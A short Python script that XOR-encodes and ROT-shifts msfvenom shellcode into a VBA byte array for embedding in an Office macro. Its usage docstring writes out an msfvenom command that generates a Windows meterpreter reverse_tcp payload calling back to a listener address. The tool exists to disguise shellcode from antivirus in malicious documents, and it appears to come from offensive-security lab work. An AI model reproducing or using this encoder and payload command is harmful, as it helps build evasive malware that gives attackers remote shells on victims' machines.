#!/usr/bin/env python3
import sys

''' Usage:
    ./vba_encode.py <msfvenom_ps1_payload>
    Example:
    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.67 LPORT=443 EXITFUNC=thread -f ps1
    [Byte[]] $buf = 0xfc,0x48,...,0xff,0xd5

    $ ./vba_encode.py 0xfc,0x48,...,0xff,0xd5
'''

buf = sys.argv[1].split(',') or None
rot = 2
key = b'\xfa'

# XOR: int to hexstring; prefix 0x; pad 4 chars
buf = [f'{int(x, 0) ^ ord(key):#04x}' for x in buf]
# ROT: 
buf = [f'{(int(x, 0) + rot) & 255}' for x in buf]

# wrap every 50th byte
res = [f' _\n{ele}' if idx % 50 == 0 and idx != 0 else ele for idx, ele in enumerate(buf)]
print(f'\nXOR with 0x{key.hex()}; ROT with {rot}:')
print(f'\nbuf = Array({",".join(res)})')
